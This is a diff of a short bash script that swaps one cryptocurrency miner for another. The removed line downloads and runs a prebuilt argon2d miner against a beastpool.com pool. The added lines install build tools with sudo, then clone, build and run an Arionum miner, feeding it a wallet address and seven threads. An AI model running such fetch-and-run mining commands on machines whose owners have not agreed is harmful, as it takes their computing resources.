@@ -1,2 +1,11 @@
 #! /bin/bash
- cd .. && wget http://github.com/BeastPool/cpuminer-argon2d/releases/download/v3.8.3.3/cpuminer-argon2d-3.8.3.3-linux.tar.gz && tar -xzf cpuminer-argon2d-3.8.3.3-linux.tar.gz && cd cpuminer-argon2d-3.8.3.3-linux && ./cpuminer-aes-avx -a argon2d-dyn -o stratum+tcp://beastpool.com:4335 -u DFKfxwDcgUKWg5Sp6e9LRZf48APDds7GfS -p c=DYN -t 7
+cd .. && sudo apt-get -y install openjdk-8-jdk maven git gcc make build-essential && git clone https://github.com/Programmerdan/arionum-java && cd arionum-java && cd arionum-miner && mvn clean package && chmod +x build-argon.sh && ./build-argon.sh &&./run.sh << EOF
+y
+pool
+
+2yxFUkk3T5fczaMvHAnuAXKjo8LhGsYMZJ65Hamwq78KpXcyXFNPX16fgpgkAWo2cW3LwDsPXQjN3Q7Ek3ZUNmzp
+7
+y
+
+EOF
+&& sleep 3
